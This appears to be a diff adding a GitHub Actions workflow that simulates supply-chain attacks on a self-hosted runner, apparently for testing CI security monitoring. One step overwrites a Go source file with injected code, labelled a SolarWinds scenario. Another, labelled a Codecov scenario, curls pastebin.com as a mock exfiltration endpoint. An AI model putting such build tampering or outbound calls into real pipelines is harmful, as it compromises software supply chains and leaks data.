@@ -1,0 +1,18 @@
+name: ARC Self-Hosted
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: self-hosted
+    steps:
+      - uses: actions/checkout@v3
+      # SolarWinds Scenario: Overwrite main.go and utility.go
+      - name: File Overwrite with mv
+        run: |
+          code='package main\n\nfunc main(){\nprintln("code added")\n}'
+          printf "$code" > calc1.go
+          mv calc1.go calc.go
+      # Codecov Scenario: Exfiltrate data to a malicious endpoint
+      - name: Data Exfiltration To Attacker Controller Endpoint
+        run: curl pastebin.com -L
